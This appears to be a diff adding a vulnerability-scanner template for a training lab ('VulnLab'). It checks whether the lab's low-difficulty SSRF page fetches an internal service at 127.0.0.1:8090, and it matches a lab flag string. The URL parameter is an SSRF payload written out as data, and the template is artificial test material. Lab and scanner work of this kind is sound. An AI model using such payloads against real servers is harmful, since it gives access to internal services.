@@ -1,0 +1,21 @@
+id: vulnlab-ssrf-low
+
+info:
+  name: VulnLab SSRF low 档
+  author: hediwen
+  severity: high
+  tags: vulnlab,ssrf
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ssrf/low.php?url=http%3A%2F%2F127.0.0.1%3A8090%2Finternal%2Finner-service.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "VULNLAB{ssrf_reached_internal_service}"
+
